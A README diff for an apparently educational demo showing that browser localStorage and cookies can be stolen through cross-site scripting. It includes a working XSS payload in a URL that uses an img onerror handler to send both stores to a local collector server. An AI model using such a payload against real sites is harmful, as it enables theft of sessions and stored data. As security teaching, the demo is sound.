@@ -20,3 +20,7 @@ Open [http://localhost:3000](http://localhost:3000) to view it in the browser.
 Example attack: http://localhost:3000/?text=<img src onerror="fetch(`http://localhost:3001?localStorage=${JSON.stringify(localStorage)}&cookie=${JSON.stringify(document.cookie)}`).then(data => data.json()).then(data => console.log('server response', data))" />
 
 Check console for the response from server
+
+## Conclusion
+
+Both localstorage and cookies are vulnerable in about the same severity. Be careful what data you store in them :)
